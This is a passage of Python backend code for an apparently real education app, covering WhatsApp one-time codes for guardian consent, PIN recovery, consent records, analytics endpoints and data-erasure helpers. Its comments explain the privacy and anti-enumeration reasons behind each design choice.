                           "parameters": [{"type": "text", "text": code}]})
    payload = {
        "messaging_product": "whatsapp",
        "to": e164.lstrip("+"),                # Meta wants digits, country code included
        "type": "template",
        "template": {"name": cfg["template"], "language": {"code": cfg["lang"]},
                     "components": components},
    }
    try:
        r = requests.post(url, json=payload, timeout=10,
                          headers={"Authorization": "Bearer " + token,
                                   "Content-Type": "application/json"})
    except Exception as e:
        return False, "network: {}".format(type(e).__name__)
    if 200 <= r.status_code < 300:
        return True, ""
    detail = ""
    try:
        detail = ((r.json().get("error") or {}).get("message") or "")[:400]
    except Exception:
        detail = (r.text or "")[:400]
    return False, "HTTP {}: {}".format(r.status_code, detail)


def _deliver_otp(e164, code, cfg):
    """Send the code on the configured channel. Returns (channel, ok, error).

    Console sends nothing at all. It exists so the whole flow can be exercised on a laptop
    and in the test suite without a Meta account, and it is fenced twice: the channel has to
    be selected in Desk AND the site has to be in developer_mode (or running tests) before
    the code is ever handed back to the caller — see send_guardian_otp. A production site
    that mis-selects Console therefore fails closed and tells nobody the code, rather than
    quietly turning its consent gate into a formality."""
    if cfg["channel"] == "Console":
        return "Console", True, ""
    ok, err = _send_otp_whatsapp(e164, code, cfg)
    return "WhatsApp", ok, err


def _console_ok():
    """True when a Console-channel code may be returned to the caller: a developer bench or
    the test runner, never a real site."""
    return bool(frappe.conf.get("developer_mode")) or bool(frappe.flags.in_test)


def _students_for_guardian(mhash):
    """Active learners whose VERIFIED guardian number hashes to `mhash`.

    guardian_verified is part of the filter, not a later check: a row carrying a hash that
    was never proven (a facilitator typing a number into Desk, say) must not be recoverable
    by whoever happens to control that number today.

    More than one is normal and supported — sisters share a guardian's handset — which is why
    the recovery flow names the girl AFTER the number is proven instead of asking for both up
    front."""
    return frappe.get_all("Student",
                          filters={"active": 1, "guardian_mobile_hash": mhash, "guardian_verified": 1},
                          fields=["name", "student_name", "avatar", "band"],
                          order_by="student_name asc")


@frappe.whitelist(allow_guest=True)
def send_guardian_otp(mobile=None, purpose="consent"):
    """Send a one-time code to a guardian's own phone.

    `purpose` is bound into the challenge and checked again on every later step, so a code
    obtained to CONSENT to a new profile cannot be redeemed to reset an existing girl's PIN.
    They are genuinely different powers: consent creates a profile, recovery takes one over.

    Every ceiling here is fail_closed, matching signup_student's reasoning and going further:
    an uncapped faucet on this endpoint does not just mint rows, it spends money on delivered
    messages and, worse, lets someone use our WhatsApp sender to spam a stranger's phone. If
    the limiter is unavailable we refuse to send. Lessons keep working regardless — nothing on
    the learning path touches this.

    The ceilings are checked cheapest-and-most-specific first so that a guardian tapping
    "resend" twice is stopped by the 60-second cooldown WITHOUT burning one of that number's
    five daily sends.

    THE DAY BUDGET IS PER PURPOSE, with a smaller total on top. Keyed on the number alone, an
    enrolment flood spent the SAME five sends a girl needs to recover her forgotten PIN: five
    guest POSTs (60s apart, purely to clear the cooldown) and that household could neither
    enrol nor reset a PIN for 24 hours, repeatable daily. Separating them reserves recovery
    from consent traffic; the total then stops the two budgets from simply doubling how many
    unexpected messages a stranger's handset can be made to receive.

    And a budget is charged only once the gateway has ACCEPTED the message — see _rate_room."""
    cfg = _otp_config()
    if not cfg:
        return {"ok": False, "error": "otp_off"}
    e164 = _norm_mobile(mobile)
    if not e164:
        return {"ok": False, "error": "bad_mobile"}
    purpose = "recovery" if _docname(purpose, 20).lower() == "recovery" else "consent"
    mhash = _mobile_hash(e164)

    ip = _client_ip()
    day_b = "otpday:" + purpose + ":" + mhash       # per purpose: recovery keeps its own room
    tot_b = "otpdayall:" + mhash                    # ...bounded overall, so it cannot double
    if not _rate_ok("otpip:" + ip, _OTP_PER_IP_HOUR, 3600, fail_closed=True):
        return {"ok": False, "error": "rate_limited"}
    # The cooldown IS charged up front — that is exactly its job, to stop a rapid re-tap, and a
    # failed send legitimately costs the caller a 60-second wait before trying again.
    if not _rate_ok("otpcool:" + purpose + ":" + mhash, 1, _OTP_RESEND_COOLDOWN, fail_closed=True):
        return {"ok": False, "error": "too_soon"}
    if not (_rate_room(day_b, _OTP_PER_NUMBER_DAY) and _rate_room(tot_b, _OTP_PER_NUMBER_DAY_TOTAL)):
        return {"ok": False, "error": "rate_limited"}

    student = None
    if purpose == "recovery":
        matches = _students_for_guardian(mhash)
        if not matches:
            # Nothing to recover. Answered as success on purpose — see the ENUMERATION note
            # above: the reply is uniform, and only the handset learns the truth.
            #
            # The budget IS charged even though nothing is sent, and that is the point. Skipping
            # it made the CEILING itself the oracle the uniform reply was there to prevent: six
            # requests against an enrolled number eventually answered rate_limited, while the
            # same six against an unknown number never did — so a caller learned which
            # households are in the programme by watching for the refusal instead of watching
            # for a message. Charging both paths identically costs nothing real (nobody is
            # recovering on a number with no learner, and the window is 24h) and keeps every
            # observable difference on the handset, where it belongs.
            for b, lim in ((day_b, _OTP_PER_NUMBER_DAY), (tot_b, _OTP_PER_NUMBER_DAY_TOTAL)):
                _rate_ok(b, lim, 86400, fail_closed=True)
            return {"ok": True, "sent": True, "last4": e164[-4:], "expires_in": cfg["ttl"] * 60}
        student = matches[0].name if len(matches) == 1 else None

    code = _otp_code()
    doc = frappe.get_doc({
        "doctype": "Hikmat OTP", "purpose": purpose.capitalize(),
        "mobile_hash": mhash, "mobile_last4": e164[-4:], "student": student,
        "code_hash": _hash_pin(code),                  # pbkdf2, same primitive as a PIN
        "expires_on": frappe.utils.add_to_date(frappe.utils.now(), minutes=cfg["ttl"]),
        "attempts": 0,
    }).insert(ignore_permissions=True)

    channel, ok, err = _deliver_otp(e164, code, cfg)
    doc.db_set({"channel": channel, "sent_ok": 1 if ok else 0, "send_error": err or None},
               update_modified=False)
    frappe.db.commit()
    if not ok:
        # Surfaced honestly rather than swallowed: a guardian who is told "sent" and gets
        # nothing has no next move, whereas the game can offer "ask your teacher" on this.
        #
        # The row DELIBERATELY STAYS, with sent_ok=0 and the gateway's own error, because a
        # facilitator debugging "no codes are arriving" needs to see that sends were attempted
        # and why they failed. What must never happen is this row COMPETING to be the code the
        # guardian types — verify only considers challenges with sent_ok=1. It could before,
        # and did: a resend whose graph call failed made the guardian's real, still-in-TTL
        # code answer "wrong code" until it expired. No day budget is charged either, so a
        # broken gateway costs her a 60-second cooldown rather than her whole day of sends.
        return {"ok": False, "error": "send_failed"}
    for b, lim in ((day_b, _OTP_PER_NUMBER_DAY), (tot_b, _OTP_PER_NUMBER_DAY_TOTAL)):
        _rate_ok(b, lim, 86400, fail_closed=True)      # charged now that it really went
    out = {"ok": True, "sent": True, "last4": e164[-4:], "expires_in": cfg["ttl"] * 60}
    if channel == "Console" and _console_ok():
        out["code"] = code                             # dev bench / test runner only
    return out


@frappe.whitelist(allow_guest=True)
def verify_guardian_otp(mobile=None, code=None, purpose="consent"):
    """Check a code and, if it is right, hand back a SINGLE-USE TICKET for the follow-up call.

    Why a ticket instead of just answering "yes, correct": the act being authorised (create a
    profile / reset a PIN) needs several more fields than a verify call should carry, and
    without a ticket the client would have to re-present the code — which means the code lives
    longer, in more places, and a replay of that one request repeats the action. The ticket is
    bound to this challenge, this number and this purpose, expires in 15 minutes, and is
    burned on use.

    The challenge is consumed under SELECT ... FOR UPDATE. That is not ceremony: two verify
    calls racing on the same code would otherwise both observe consumed_on empty and both
    mint a valid ticket, turning a single-use code into a double-use one.

    Wrong guesses are counted on the challenge itself (5, then it is dead) AND per source per
    hour. The per-challenge ceiling is the real control — a 6-digit code is 1 in a million, so
    5 tries is nowhere near guessable, while a source ceiling alone would fall to anyone who
    can vary their IP (precisely the hole that made the old PIN lockout worthless; see the PIN
    LOCKOUT note).

    EVERY LIVE CHALLENGE IS TRIED, not just the newest. This used to take
    `order_by creation desc limit 1`, which broke the two commonest real situations at once:
      * a guardian on 2G taps "Send it again" because nothing has arrived, then the FIRST
        message lands — and typing its perfectly valid code answered "wrong code", because
        only the newer row was ever consulted;
      * two sisters on one handset (which _students_for_guardian exists to support) enrolling
        minutes apart — the second send silently killed the first girl's code.
    In both cases her repeated, correct attempts then burned the newer challenge's budget
    until BOTH were dead.
    A WRONG guess is charged to every live challenge for that number, so widening this does
    NOT widen the guessing budget: five wrong codes still end the number's attempts, whether
    there is one outstanding challenge or three. That is the honest reading of "5 tries" —
    per number, not per row — and it is what stops a resend from being a way to buy more
    guesses.

    `tries_left` is deliberately NOT reported. It looked like a kindness, and it was an
    unauthenticated oracle: the field was present only when a live challenge existed for that
    number, so one send plus one deliberately-wrong verify told a caller whether a phone
    number belongs to a family in this programme — without ever touching the handset, which is
    precisely the leak the ENUMERATION note above promises the API does not have. The screen
    says "wrong code, try again" instead; the ceiling is enforced, not advertised."""
    cfg = _otp_config()
    if not cfg:
        return {"ok": False, "error": "otp_off"}
    e164 = _norm_mobile(mobile)
    if not e164:
        return {"ok": False, "error": "bad_mobile"}
    if not _rate_ok("otpver:" + _client_ip(), _OTP_VERIFY_PER_IP_HOUR, 3600, fail_closed=True):
        return {"ok": False, "error": "rate_limited"}
    purpose = "Recovery" if _docname(purpose, 20).lower() == "recovery" else "Consent"
    code = _docname(code, 12)
    mhash = _mobile_hash(e164)

    # sent_ok=1: a challenge the gateway REFUSED was never in anyone's hand, so it must not be
    # able to answer for one that was. attempts: a spent challenge drops out of the running
    # rather than shadowing a live one. The cap is a sanity bound — the day ceilings mean there
    # can only be a handful.
    rows = frappe.get_all("Hikmat OTP",
                          filters={"mobile_hash": mhash, "purpose": purpose, "sent_ok": 1,
                                   "consumed_on": ["is", "not set"],
                                   "attempts": ["<", _OTP_MAX_ATTEMPTS],
                                   "expires_on": [">", frappe.utils.now()]},
                          fields=["name", "code_hash", "attempts"],
                          order_by="creation desc", limit=20)
    match = next((r for r in rows if _pin_ok(r.code_hash, code)), None)   # constant-time compare
    if not match:
        for r in rows:      # one shared budget: a resend does not buy extra guesses
            frappe.db.set_value("Hikmat OTP", r.name, "attempts", _int(r.attempts) + 1,
                                update_modified=False)
        frappe.db.commit()
        return {"ok": False, "error": "bad_code"}

    name = match.name
    # Re-read the winner under a row lock before consuming it: two verify calls racing on the
    # same code would otherwise both see consumed_on empty and both mint a valid ticket.
    locked = frappe.db.get_value("Hikmat OTP", name, ["consumed_on"], as_dict=True,
                                 for_update=True)
    if not locked or locked.consumed_on:
        return {"ok": False, "error": "bad_code"}

    ticket = frappe.generate_hash(length=40)
    frappe.db.set_value("Hikmat OTP", name, {
        "consumed_on": frappe.utils.now(),
        "ticket_hash": hashlib.sha256(ticket.encode("utf-8")).hexdigest(),
        "ticket_expires_on": frappe.utils.add_to_date(frappe.utils.now(),
                                                      seconds=_TICKET_TTL_SECONDS),
    }, update_modified=False)
    frappe.db.commit()
    out = {"ok": True, "ticket": ticket, "last4": e164[-4:],
           "expires_in": _TICKET_TTL_SECONDS}
    if purpose == "Recovery":
        # Safe to name them only now: whoever holds this ticket has demonstrated control of
        # the guardian's handset, so listing that guardian's OWN daughters reveals nothing
        # they do not already know — and it spares a low-literacy user from having to type a
        # name that must match what a facilitator once spelled.
        out["students"] = [{"id": s.name, "name": s.student_name, "avatar": s.avatar or "🙂"}
                           for s in _students_for_guardian(mhash)]
    return out


def _find_ticket(mhash, purpose, ticket):
    """Locate a live, unused ticket and LOCK its row, without burning it. Returns the challenge
    name, or None.

    Both halves are required: the ticket AND the number it was issued for. The client
    re-sends the number, we re-hash it, and only a challenge matching both is redeemable — so
    a leaked ticket on its own (a shared screen, a URL in a log) authorises nothing.

    Finding is SEPARATE from burning so a caller can establish "this request is authorised"
    before it does anything that might refuse for an unrelated reason. reset_pin needs exactly
    that: it used to answer whether a girl belonged to a number BEFORE it looked at the ticket,
    which made an unmetered membership oracle out of an endpoint that authorises a PIN change
    (see reset_pin).

    Every live ticket for the number is considered, not just the newest: two sisters on one
    handset can each be holding one, and `limit 1` silently invalidated the elder's.

    Compared in Python with compare_digest against a FOR UPDATE row rather than looked up by
    ticket hash, for the same reason the challenge is: the row has to be locked before its
    used-flag is read, or two concurrent redemptions both see it unused."""
    ticket = _docname(ticket, 80)
    if not ticket:
        return None
    want = hashlib.sha256(ticket.encode("utf-8")).hexdigest()
    rows = frappe.get_all("Hikmat OTP",
                          filters={"mobile_hash": mhash, "purpose": purpose, "sent_ok": 1,
                                   "ticket_used_on": ["is", "not set"],
                                   "ticket_expires_on": [">", frappe.utils.now()]},
                          fields=["name"], order_by="creation desc", limit=20)
    for r in rows:
        row = frappe.db.get_value("Hikmat OTP", r.name, ["ticket_hash", "ticket_used_on"],
                                  as_dict=True, for_update=True)
        if not row or row.ticket_used_on or not row.ticket_hash:
            continue
        if hmac.compare_digest(str(row.ticket_hash), want):
            return r.name
    return None


def _burn_ticket(name):
    """Spend a ticket found by _find_ticket. Its row is already locked by that call."""
    frappe.db.set_value("Hikmat OTP", name, "ticket_used_on", frappe.utils.now(),
                        update_modified=False)


def _redeem_ticket(mhash, purpose, ticket):
    """Find and burn in one step, for callers with nothing to check in between."""
    name = _find_ticket(mhash, purpose, ticket)
    if name:
        _burn_ticket(name)
    return name


def _file_consent(student, student_name, mhash, last4, channel, otp=None, note=None):
    """Write the consent record and stamp the Student. One place, so the campus route (a
    facilitator recording an in-person permission) and the WhatsApp route cannot end up
    meaning subtly different things.

    The wording is snapshotted from the server constant — see _CONSENT_VERSION.

    THE STUDENT UPDATE IS BUILT CONDITIONALLY, and that is a correctness fix, not tidiness.
    It used to write the hash and last-4 unconditionally, so recording an attested consent
    with no number — which record_guardian_consent explicitly allows, and which a facilitator
    filing a paper form months later would naturally do — issued
    `UPDATE tabStudent SET guardian_mobile_hash = NULL, guardian_mobile_last4 = NULL`
    over a number a guardian had already PROVEN. That silently destroyed her only route to a
    PIN reset: recovery matches on the hash, so her guardian's real number then matched
    nothing, and because an unknown number is answered uniformly ("if that number is on file,
    a code is on its way") she would have waited for a message that could never come, with
    nothing anywhere saying why. Adding a consent record must never subtract evidence."""
    frappe.get_doc({
        "doctype": "Hikmat Consent", "student": student, "student_name": student_name,
        "verified_on": frappe.utils.now(), "channel": channel,
        "guardian_mobile_hash": mhash, "guardian_mobile_last4": last4, "otp": otp,
        "attested_note": _plain_text(note)[:500] if note else None,
        "consent_text_version": _CONSENT_VERSION,
        "consent_text": _CONSENT_TEXT_EN + "\n\n" + _CONSENT_TEXT_HI,
    }).insert(ignore_permissions=True)
    stamp = {"guardian_verified": 1, "guardian_consent_on": frappe.utils.now()}
    if mhash:                      # never overwrite a proven number with nothing
        stamp["guardian_mobile_hash"] = mhash
        stamp["guardian_mobile_last4"] = last4
    frappe.db.set_value("Student", student, stamp, update_modified=False)


@frappe.whitelist(allow_guest=True)
def signup_with_consent(mobile=None, ticket=None, name=None, avatar=None, pin=None,
                        age=None, band=None, gender=None, mascot=None):
    """Create a learner's profile against a guardian's PROVEN number.

    This is signup_student with a verified adult behind it: same validation, same rate limit,
    same shape of answer, so the game's finishLogin path is unchanged. The difference is that
    the profile carries a real consent record instead of a tickbox.

    Order of operations: the form is validated, THEN the ticket is redeemed, THEN the row is
    inserted. Validating first means a typo does not spend the guardian's code (see
    _validated_profile_fields); redeeming before the insert means a replayed or expired ticket
    creates nothing."""
    cfg = _otp_config()
    if not cfg:
        return {"ok": False, "error": "otp_off"}
    if not _rate_ok("signup:" + _client_ip(), 60, 3600, fail_closed=True):   # see signup_student
        return {"ok": False, "error": "rate_limited"}
    e164 = _norm_mobile(mobile)
    if not e164:
        return {"ok": False, "error": "bad_mobile"}
    mhash = _mobile_hash(e164)
    # Form first, ticket second: a rejected name or PIN must not cost the guardian their code.
    fields, err = _validated_profile_fields(name, avatar, pin, age, band, gender, mascot)
    if err:
        return {"ok": False, "error": err}
    otp = _redeem_ticket(mhash, "Consent", ticket)
    if not otp:
        return {"ok": False, "error": "bad_ticket"}
    doc = _insert_self_signup_student(fields)
    _file_consent(doc.name, doc.student_name, mhash, e164[-4:], cfg["channel"], otp)
    token = _token_for(doc.name)
    frappe.db.commit()
    return {"ok": True, "id": doc.name, "name": doc.student_name, "avatar": doc.avatar or "🙂",
            "hasPin": True, "token": token, "band": doc.band or "",
            "gender": doc.gender or "", "mascot": doc.mascot or "roshni",
            "guardianLast4": e164[-4:]}


@frappe.whitelist(allow_guest=True)
def reset_pin(mobile=None, ticket=None, student=None, new_pin=None):
    """Set a new PIN for a girl whose guardian has just proven their number.

    THE GAP THIS FILLS: until now a forgotten PIN was terminal. There was no reset endpoint at
    all — not even a staff one — so the only cure was a facilitator editing login_pin in Desk,
    and a home learner with no facilitator simply lost her stars.

    `student` must be one of THIS guardian's learners, re-checked here against the number's
    hash rather than trusted from the client: the list handed out by verify_guardian_otp is a
    convenience, not an authorisation, and a crafted call must not be able to name someone
    else's daughter.

    The bearer token is deliberately NOT rotated. A campus laptop authenticates her offline
    against a cached roster entry, so rotating would silently break every provisioned device
    she uses to punish a guardian for using the recovery flow. The reset already required
    control of the guardian's handset, and the lockout counters are cleared so she can get
    straight back in.

    Facilitators are notified. A PIN reset is exactly the event a supervising adult should see
    after the fact, and it is cheap to send.

    ORDER AND METERING ARE THE SECURITY HERE, and both were wrong. This endpoint used to
    answer the membership question — "is this number the verified guardian of this exact
    girl?" — BEFORE it looked at the ticket, and with no rate limit of any kind. So a guest
    holding a Student docname could probe with a junk ticket and read the answer off the error
    code: `bad_ticket` meant yes, `not_found` meant no. Nothing was spent, written or logged,
    and docnames are not secret — a provisioned campus laptop caches the whole roster, and any
    girl's own id sits in her localStorage. That mapped an arbitrary phone number to one
    specific named minor in at most one request per name.
    Now: fail-closed ceilings first, then the TICKET (found but not yet burned), then
    membership, and BOTH failures answer `bad_ticket` — so neither reveals the other. The
    ticket is burned only once the whole request is known to be good, so a legitimate guardian
    who fumbles does not lose it."""
    cfg = _otp_config()
    if not cfg:
        return {"ok": False, "error": "otp_off"}
    e164 = _norm_mobile(mobile)
    if not e164:
        return {"ok": False, "error": "bad_mobile"}
    new_pin = _docname(new_pin, 16)                    # may arrive as a JSON number
    if not (new_pin.isdigit() and 4 <= len(new_pin) <= 8):
        return {"ok": False, "error": "bad_pin"}
    mhash = _mobile_hash(e164)
    student = _docname(student)
    # Fail closed, like every other pre-auth door here: this one changes a credential, so an
    # uncapped faucet is both a probing tool and a way to grind pbkdf2.
    if not _rate_ok("otpreset:" + mhash, _OTP_RESET_PER_NUMBER_HOUR, 3600, fail_closed=True) \
            or not _rate_ok("otpresetip:" + _client_ip(), _OTP_RESET_PER_IP_HOUR, 3600,
                            fail_closed=True):
        return {"ok": False, "error": "rate_limited"}
    # Ticket BEFORE membership, and one shared refusal for both — see the docstring.
    otp = _find_ticket(mhash, "Recovery", ticket)
    mine = {s.name: s for s in _students_for_guardian(mhash)}
    if not otp or student not in mine:
        return {"ok": False, "error": "bad_ticket"}
    _burn_ticket(otp)

    frappe.db.set_value("Student", student, "login_pin", _hash_pin(new_pin),
                        update_modified=False)
    row = mine[student]
    # Both lockout buckets she could be held in — by docname, and by the name she types.
    _login_succeeded(_login_id_account(student, student))
    _login_succeeded(_login_account_key("nm", _login_name_key(row.student_name)))
    token = _token_for(student)
    frappe.db.commit()
    _notify_facilitators("PIN reset by guardian: {}".format(row.student_name),
                         "Student", student)
    return {"ok": True, "id": student, "name": row.student_name,
            "avatar": row.avatar or "🙂", "token": token, "band": row.band or ""}


@frappe.whitelist()   # STAFF-ONLY — enforced by _require_staff(), not by the decorator
def record_guardian_consent(student=None, mobile=None, note=None):
    """Record a guardian's permission that was given IN PERSON, on paper or by phone call.

    This is not a convenience door around the OTP — it is the only route that exists for the
    families the chosen channel cannot reach. WhatsApp needs a smartphone and data; a guardian
    with a feature phone or no data can never receive a code, and those are disproportionately
    the poorest households in the programme. Refusing them a verified profile would make the
    consent gate a wealth filter, so a facilitator who has met the guardian can attest to it
    and the record says so honestly: channel "Facilitator", `verified_on` now, and the
    facilitator's own user on the row's owner. An auditor can therefore tell an attested
    consent from a device-proven one, which is the point — they are not the same evidence.

    The number is optional and, when given, is stored the same way as any other: hash plus
    last 4, never the number. `guardian_verified` is set because a human verified it; what
    differs is HOW, and that is on the record."""
    _require_staff()
    student = _docname(student)
    if not student or not frappe.db.exists("Student", student):
        return {"ok": False, "error": "not_found"}
    e164 = _norm_mobile(mobile) if mobile else ""
    if mobile and not e164:
        return {"ok": False, "error": "bad_mobile"}
    mhash = _mobile_hash(e164) if e164 else None
    sname = frappe.db.get_value("Student", student, "student_name")
    # The note goes in ON INSERT, into its own field. It used to be written afterwards into
    # `withdrawn_note` on whichever row a re-query said was newest — wrong field (an auditor
    # would see a withdrawal note on a consent that was never withdrawn) and wrong row waiting
    # to happen (a concurrent insert, or a girl with an earlier device-proven consent, and the
    # note lands on somebody else's evidence).
    _file_consent(student, sname, mhash, e164[-4:] if e164 else None, "Facilitator", note=note)
    frappe.db.commit()
    return {"ok": True, "student": student, "last4": e164[-4:] if e164 else ""}


def prune_otp_records():
    """Daily hygiene: drop challenges older than _OTP_KEEP_DAYS.

    Storage limitation, and it costs nothing to honour: a spent or expired challenge has no
    further use, and even though the rows hold neither a number nor a usable code, a pile of
    "this number was verified on this date" is data we have no reason to keep. Wired in
    hooks.py next to prune_attendance_pings. Consent records are NOT pruned — they are the
    proof of permission and must outlive the challenge that produced them."""
    cutoff = frappe.utils.add_days(frappe.utils.nowdate(), -_OTP_KEEP_DAYS)
    stale = frappe.get_all("Hikmat OTP", filters={"creation": ["<", cutoff]}, pluck="name")
    if not stale:
        return
    # Clear the Consent -> challenge link FIRST. frappe.db.delete is a raw DELETE that neither
    # nulls nor checks referring links, so pruning left every consent record older than 30 days
    # pointing at a row that no longer exists — and Frappe validates links on SAVE, so the next
    # time anyone opened that record to set `withdrawn_on` (the DPDP withdrawal the doctype's
    # own description promises) the save was refused with "Could not find Verified by
    # challenge". The field is read_only, so Desk offered no way to clear it, and this app is
    # deployed with no shell: the only fix would have been another patch release. The link is
    # an audit breadcrumb, not a live relation, so dropping it when the challenge ages out is
    # correct — the consent record keeps everything that matters on its own row.
    for i in range(0, len(stale), 500):
        chunk = stale[i:i + 500]
        # A filter dict here IS a bulk UPDATE — normally the bug this file warns about loudest
        # (see _token_for). It is deliberate and safe in this one place: `chunk` is a list of
        # docnames this function just selected itself, never a caller's argument, and clearing
        # every consent row that points at a pruned challenge is exactly the intent.
        frappe.db.set_value("Hikmat Consent", {"otp": ["in", chunk]}, "otp", None,
                            update_modified=False)
        frappe.db.delete("Hikmat OTP", {"name": ["in", chunk]})
    frappe.db.commit()


# ---------------------------------------------------------------------------
# Analytics — STAFF-ONLY. These back Desk number cards (setup_data.py), which run in a
# facilitator's own session, so the gate costs the dashboards nothing. "Not guest" was
# never enough on its own: every online learner is a Website User, so the bare
# whitelist let any child read programme-wide figures. See the STAFF GATE note above.
# ---------------------------------------------------------------------------
@frappe.whitelist()
def active_student_count():
    """Distinct students who have at least one attempt (for the analytics card)."""
    _require_staff()
    r = frappe.db.sql("select count(distinct student) from `tabLesson Attempt`")
    return r[0][0] if r else 0


@frappe.whitelist()
def average_stars():
    """Avg stars across attempts, to 2 decimals (Int-field averaging mis-formats as currency)."""
    _require_staff()
    r = frappe.db.sql("select avg(stars) from `tabLesson Attempt`")
    return round(r[0][0], 2) if r and r[0][0] is not None else 0


@frappe.whitelist(allow_guest=True)
def set_profile(student=None, token=None, mascot=None, gender=None):
    """Save a learner's own presentation choices — which named guide asks her the questions,
    and the gender the Hindi has to agree with.

    Why this exists at all: both are chosen at signup, but they are also changeable from the
    in-app menu, and the roster runs on ~30 SHARED campus laptops. Keeping the choice only in
    localStorage means a girl who picks Sheru on Monday is greeted by Roshni on Tuesday's
    laptop, and — worse — a boy who set himself as a boy is addressed as a girl in Hindi by
    every machine except the one he happened to sign up on.

    Deliberately narrow: it can write nothing but these two whitelisted enums, on the caller's
    OWN row, proven by the same bearer token (or online session) every other per-student
    endpoint uses. It cannot touch a name, a PIN, a band, a cohort or the active flag, so the
    worst a stolen token can do here is change whose face says hello.

    Fail-open by design on the client side: the game writes the choice to localStorage FIRST
    and calls this fire-and-forget, because picking a friend must work with no network at all.
    A failure here costs the cross-device sync, never the choice."""
    if not student:
        student = _session_student()
    if not student or not _authorized(student, token):
        return {"ok": False, "error": "not_authorized"}
    vals = {}
    mas = _plain_text(mascot).lower()
    if mas:
        if mas not in MASCOT_IDS:
            return {"ok": False, "error": "bad_mascot"}
        vals["mascot"] = mas
    g = _plain_text(gender)
    if g:
        if g not in GENDERS:
            return {"ok": False, "error": "bad_gender"}
        vals["gender"] = g
    if not vals:
        return {"ok": False, "error": "nothing_to_set"}
    # update_modified=False: this is a preference, not a content edit, and letting it bump
    # `modified` would reorder every Desk list that sorts on it (Student.sort_field) every
    # time a child tries on a different guide.
    frappe.db.set_value("Student", student, vals, update_modified=False)
    frappe.db.commit()
    return {"ok": True, "mascot": vals.get("mascot", ""), "gender": vals.get("gender", "")}


@frappe.whitelist(allow_guest=True)
def get_progress(student=None, token=None):
    """Best stars per track/lesson/activity for one student — so progress follows the
    girl across shared laptops. Requires the student's login token (campus) or a matching
    online session (no reading another child's progress by guessing an id). Aggregated in
    SQL so the response is one row per (track,lesson,activity) regardless of replays."""
    if not student:
        student = _session_student()                         # online client authed by session
    if not student or not _authorized(student, token):
        return {"progress": {}}
    rows = frappe.db.sql(
        """select track, lesson, activity, max(stars) as stars
           from `tabLesson Attempt` where student=%s
           group by track, lesson, activity""",
        student, as_dict=True)
    prog = {}
    for r in rows:
        prog.setdefault(r.track, {}).setdefault(r.lesson, {})[r.activity] = r.stars or 0
    # Module tests: pass/best per track, plus the union of every question id this
    # student has ever been served (ordered by first exposure) — so a girl on a NEW
    # device keeps her no-repeat guarantee once she's online. Bounded by bank sizes.
    tests = {}
    for r in frappe.db.sql(
            """select track, max(passed) as passed, max(pct) as best, count(*) as attempts
               from `tabTest Attempt` where student=%s group by track""", student, as_dict=True):
        tests[r.track] = {"passed": bool(r.passed), "bestPct": _int(r.best), "attempts": _int(r.attempts)}
    test_seen = {}
    if tests:
        for a in frappe.get_all("Test Attempt", filters={"student": student},
                                fields=["track", "paper"], order_by="attempted_on asc, creation asc"):
            try:
                ids = json.loads(a.paper or "[]")
            except Exception:
                ids = []
            dst = test_seen.setdefault(a.track, [])
            for qid in ids:
                if qid not in dst:
                    dst.append(qid)
    return {"progress": prog, "gems": _total_gems(student),
            "tests": tests, "testSeen": test_seen}


# ---------------------------------------------------------------------------
# Right to erasure. Deletion has to reach every row keyed on the child's id, the
# Frappe User of an online learner, and the bookkeeping rows Frappe leaves behind
# NAMING those docs. Both entry points — delete_student (one child) and
# setup_data.wipe_demo_data (production cutover) — go through the helpers below:
# when the two kept their own lists, a table ended up erased by neither.
#
# This used to also unlink private audio bytes off disk, with the invariants that go
# with a delete that cannot be rolled back. The app no longer records anything (the
# Bhojpuri AI / Boli pipeline was removed outright; v12_remove_boli erases what older
# builds left behind), so what remains here is rows only. The one invariant that
# outlives that removal: ERASING ONE CHILD MUST NOT COST ANOTHER ONE ANYTHING.
# ---------------------------------------------------------------------------
# Everything keyed on `student`, children before parents. Both erasure paths
# walk this list so neither can forget a table again.
_LEARNER_DOCTYPES = ("Hikmat Consent", "Hikmat OTP",
                     "AI Conversation Turn", "AI Conversation", "Lesson Doubt",
                     "Lesson Attempt", "Test Attempt", "Learning Event",
                     "Attendance Ping", "Attendance Day")
# Hikmat Consent is listed FIRST, and it is not optional. It denormalises student_name, so
# leaving it out meant an "erase ALL her data" that left the child's NAME behind — the exact
# residue the rest of this section exists to remove — plus her guardian's number hash. There
# is a tempting argument for keeping consent records after erasure ("proof we were allowed
# to process her data"), and it is self-defeating: once her data is gone there is nothing
# left to justify, and holding her name in order to prove we were permitted to hold her name
# is not a retention basis. It goes. (Before Consent, so the row that LINKS to a challenge
# is gone before the challenge — tidiness only, since _erase passes force=1 and so skips
# Frappe's link check.)
# Hikmat OTP is erased BY THE `student` LINK, which covers her Recovery challenges. The
# enrolment (purpose="Consent") challenge has no student — it predates her profile by a few
# seconds — and is deliberately left to prune_otp_records: it holds no name and no number,
# only a keyed hash of a guardian's number, and once the Consent row above is gone nothing
# ties it to her. Deleting it by mobile_hash instead would reach across to a SISTER on the
# same handset, whose challenges are her own business.
# Bookkeeping tables that record a document's identity: {table: (doctype field, name field)}.
# Frappe clears these from delete_dynamic_links, which delete_doc only ENQUEUES
# (enqueue_after_commit=True) — on a site whose worker is down, or a campus box with no
# worker at all, those rows simply stay, so "erase ALL her data" still left her ids in
# Notification Log / Comment / DocShare. Erasure now does that cleanup synchronously; the
# queued job later finds nothing left to do.
_RESIDUE_TABLES = {"Comment": ("reference_doctype", "reference_name"),
                   "Version": ("ref_doctype", "docname"),
                   "Notification Log": ("document_type", "document_name"),
                   "ToDo": ("reference_type", "reference_name"),
                   "DocShare": ("share_doctype", "share_name"),
                   "View Log": ("reference_doctype", "reference_name"),
                   "Document Follow": ("ref_doctype", "ref_docname"),
                   "Deleted Document": ("deleted_doctype", "deleted_name")}


def _erasable(doctype, filters):
    """Names of the rows to erase — empty when the doctype predates this site."""
    if not frappe.db.exists("DocType", doctype):
        return []
    return frappe.get_all(doctype, filters=filters, pluck="name")


def _erase(doctype, names, receipt=None):
    """Force-delete rows permanently: delete_permanently skips the Deleted Document
    copy, which would otherwise keep the erased child's data around as JSON.

    `receipt` collects the (doctype, name) pairs actually deleted so _scrub_name_residue
    can find the bookkeeping rows Frappe leaves behind NAMING those docs — matching on an
    exact doc name is what keeps the scrub from ever touching another child's rows."""
    for name in names:
        frappe.delete_doc(doctype, name, force=1, ignore_permissions=True,
                          delete_permanently=True)
        if receipt is not None:
            receipt.append((doctype, name))
    return len(names)


def _db_delete_names(table, names):
    """Raw-delete rows by primary key, chunked. Raw because these are bookkeeping rows: no
    controller, and running on_trash would only mint fresh residue (a delete feed entry)."""
    for i in range(0, len(names), 500):
